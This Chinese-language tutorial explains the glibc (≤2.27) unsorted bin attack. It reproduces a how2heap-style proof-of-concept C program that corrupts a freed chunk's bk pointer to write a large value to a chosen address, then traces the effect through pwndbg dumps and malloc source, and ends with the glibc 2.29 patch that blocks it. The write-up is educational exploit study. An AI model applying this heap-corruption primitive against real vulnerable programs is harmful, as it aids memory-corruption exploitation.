# 前言
这一小节我们重新来看一下unsortedbin attack，这个作用是想某个地址中写入超大值，除了这一点，**<font style="color:#F5222D;">我们可以向global_max_fast写入一个超大值，从而使用fastbin attack进行攻击。</font>**

# 影响版本
glibc <= version 2.27（不清楚glibc 2.28是否修复，懒得看了）

# POC
## POC源码
```c
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main(){
	fprintf(stderr, "This technique only works with buffers not going into tcache, either because the tcache-option for "
		    "glibc was disabled, or because the buffers are bigger than 0x408 bytes. See build_glibc.sh for build "
		    "instructions.\n");
	fprintf(stderr, "This file demonstrates unsorted bin attack by write a large unsigned long value into stack\n");
	fprintf(stderr, "In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the "
		   "global variable global_max_fast in libc for further fastbin attack\n\n");

	volatile unsigned long stack_var=0;
	fprintf(stderr, "Let's first look at the target we want to rewrite on stack:\n");
	fprintf(stderr, "%p: %ld\n\n", &stack_var, stack_var);

	unsigned long *p=malloc(0x410);
	fprintf(stderr, "Now, we allocate first normal chunk on the heap at: %p\n",p);
	fprintf(stderr, "And allocate another normal chunk in order to avoid consolidating the top chunk with"
           "the first one during the free()\n\n");
	malloc(500);

	free(p);
	fprintf(stderr, "We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer "
		   "point to %p\n",(void*)p[1]);

	//------------VULNERABILITY-----------

	p[1]=(unsigned long)(&stack_var-2);
	fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim->bk pointer\n");
	fprintf(stderr, "And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n",(void*)p[1]);

	//------------------------------------

	malloc(0x410);
	fprintf(stderr, "Let's malloc again to get the chunk we just free. During this time, the target should have already been "
		   "rewritten:\n");
	fprintf(stderr, "%p: %p\n", &stack_var, (void*)stack_var);

	assert(stack_var != 0);
}

```

## POC分析
在POC的开头打印出了我们需要控制的地址：stack_var（b 17->r）：

```c
	volatile unsigned long stack_var=0;
	fprintf(stderr, "Let's first look at the target we want to rewrite on stack:\n");
	fprintf(stderr, "%p: %ld\n\n", &stack_var, stack_var);
#Let's first look at the target we want to rewrite on stack:
#0x7fffffffddc8: 0
```

stack_var的内存状况如下：

```c
pwndbg> x/16gx &stack_var
0x7fffffffddc8:	0x0000000000000000	0x00007fffffffdec0
0x7fffffffddd8:	0x76f1b24f6509d200	0x0000555555554a60
0x7fffffffdde8:	0x00007ffff7a03bf7	0x0000000000000001
0x7fffffffddf8:	0x00007fffffffdec8	0x000000010000c000
0x7fffffffde08:	0x000055555555481a	0x0000000000000000
0x7fffffffde18:	0x442287353d921ff8	0x0000555555554710
0x7fffffffde28:	0x00007fffffffdec0	0x0000000000000000
0x7fffffffde38:	0x0000000000000000	0x1177d26012b21ff8
pwndbg> 
```

接下来我们创建两个堆块，其中第一个堆块当作我们的victim，第二个堆块是为了防止第一个堆块free后与top_chunk合并，可以遇见的是在free掉victim堆块之后它会进入到unsortedbin中；另外第一个堆块的大小不能属于tcachebin和smallbin（b 24->c）：

```c
	unsigned long *p=malloc(0x410);
	fprintf(stderr, "Now, we allocate first normal chunk on the heap at: %p\n",p);
	fprintf(stderr, "And allocate another normal chunk in order to avoid consolidating the top chunk with"
           "the first one during the free()\n\n");
	malloc(500);

	free(p);
```

结果如下：

```c
pwndbg> x/300gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcachebin
......
0x555555757250:	0x0000000000000000	0x0000000000000421 #chunk_victim
0x555555757260:	0x00007ffff7dcdca0	0x00007ffff7dcdca0
......
0x555555757670:	0x0000000000000420	0x0000000000000200 #chunk--avoid top_chunk
......
0x555555757870:	0x0000000000000000	0x0000000000020791 #top_chunk
......
0x555555757950:	0x0000000000000000	0x0000000000000000
pwndbg>
```

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1621325134515-b681e9d2-d666-493f-9a1d-df4fa983879a.png)

假如现在有堆溢出或UAF漏洞可以修改chunk_victim的bk指针到之前的stack_var（你没看错，又是bk指针）（b 35->c）：

```c
	fprintf(stderr, "We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer "
		   "point to %p\n",(void*)p[1]);

	//------------VULNERABILITY-----------

	p[1]=(unsigned long)(&stack_var-2);
	fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim->bk pointer\n");
	fprintf(stderr, "And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n",(void*)p[1]);

	//------------------------------------
```

效果如下：

```c
pwndbg> x/300gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcachebin
......
0x555555757250:	0x0000000000000000	0x0000000000000421 #chunk_victim
0x555555757260:	0x00007ffff7dcdca0	0x00007fffffffddb8
    							   #stack_var
    							   #0x00007ffff7dcdca0
......
0x555555757670:	0x0000000000000420	0x0000000000000200 #chunk--avoid top_chunk
......
0x555555757870:	0x0000000000000000	0x0000000000020791 #top_chunk
......
0x555555757950:	0x0000000000000000	0x0000000000000000
pwndbg>
```

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1621325405363-407ac8e7-529b-4c9c-854e-9450fa18d7bd.png)

接下来是重点，我们将把chunk_victim从unsortedbin中申请出来：

```c
	malloc(0x410);
```

这里选择引入源码调试，重点malloc源码如下：

```c
  for (;; )
    {
      int iters = 0;
      while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av)) //victim==0x555555757250
        {
          bck = victim->bk; //bck==0x7fffffffddb8
          if (__builtin_expect (chunksize_nomask (victim) <= 2 * SIZE_SZ, 0)
              || __builtin_expect (chunksize_nomask (victim)
				   > av->system_mem, 0)) //检查堆块的大小是否异常
            malloc_printerr ("malloc(): memory corruption");
          size = chunksize (victim); //size==0x420

          /*
             If a small request, try to use last remainder if it is the
             only chunk in unsorted bin.  This helps promote locality for
             runs of consecutive small requests. This is the only
             exception to best-fit, and applies only when there is
             no exact fit for a small chunk.
           */

          if (in_smallbin_range (nb) &&
              bck == unsorted_chunks (av) &&
              victim == av->last_remainder &&
              (unsigned long) (size) > (unsigned long) (nb + MINSIZE)) //不会进入此if语句
            {
              ......
            }

          /* remove from unsorted list */
          unsorted_chunks (av)->bk = bck;
          bck->fd = unsorted_chunks (av);
```

由于这次申请的堆块大小为0x410，和unsortedbin中的free chunk大小相同，这里首先对unsortedbin中的free chunk进行解链，解链后会向stack_var写入一个超大值，这个值是&main_arena，整个过程详见如下PPT：

[unsortedbin attack.pptx](https://www.yuque.com/attachments/yuque/0/2021/pptx/574026/1621328639397-83270097-04b0-4954-a590-04395629f27b.pptx)



> **<font style="color:#F5222D;">注意：在glibc 2.27中此过程没有任何检查</font>**
>

之后会直接返回申请的victim即0x555555757250（chunk_victim）：

```c
          /* Take now instead of binning if exact fit */

          if (size == nb)
            {
              set_inuse_bit_at_offset (victim, size);
              if (av != &main_arena)
		set_non_main_arena (victim);
#if USE_TCACHE
	      /* Fill cache first, return to user only if cache fills.
		 We may return one of these chunks later.  */
	      if (tcache_nb
		  && tcache->counts[tc_idx] < mp_.tcache_count)
		{
		  tcache_put (victim, tc_idx);
		  return_cached = 1;
		  continue;
		}
	      else
		{
#endif
              check_malloced_chunk (av, victim, nb);
              void *p = chunk2mem (victim);
              alloc_perturb (p, bytes);
              return p;
#if USE_TCACHE
		}
#endif
            }
```

最终结果如下：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1621328773304-e8961c0c-ea5a-436c-917c-1d440f467b14.png)

另外再多说几句：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1621329011783-31958d52-c952-4654-a6d7-799e73bd5099.png)

如上图所示，在那时虽然stack_var的bk已经被设置，但是是没有用的，因为之后在解链时会进行重新设置：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1621329103323-f131e835-2dc2-4a8a-a4ef-ccb543bfeb5c.png)

这里会牵扯到栈布局，也就是说stack_var的bk指针是没有必要设置的😂，实际上stack_var的fd和bk位都不需要设置。

# 漏洞封堵
以下代码是glibc 2.29的malloc源码：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1621329733425-4072a257-0542-43e9-9bda-1c6cef23017b.png)

主要是这一句：

```c
          if (__glibc_unlikely (bck->fd != victim)
              || __glibc_unlikely (victim->fd != unsorted_chunks (av)))
            malloc_printerr ("malloc(): unsorted double linked list corrupted");
```

**<font style="color:#F5222D;">这一句话对unsortedbin attack是致命的，这会导致此种攻击方式几乎不可用：</font>**

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1621330310479-8bbf8bb1-0efc-4859-bc08-93d286e2130a.png)![](https://cdn.nlark.com/yuque/0/2021/png/574026/1621330322146-418fa8db-7380-4f82-bc95-afa159337fad.png)

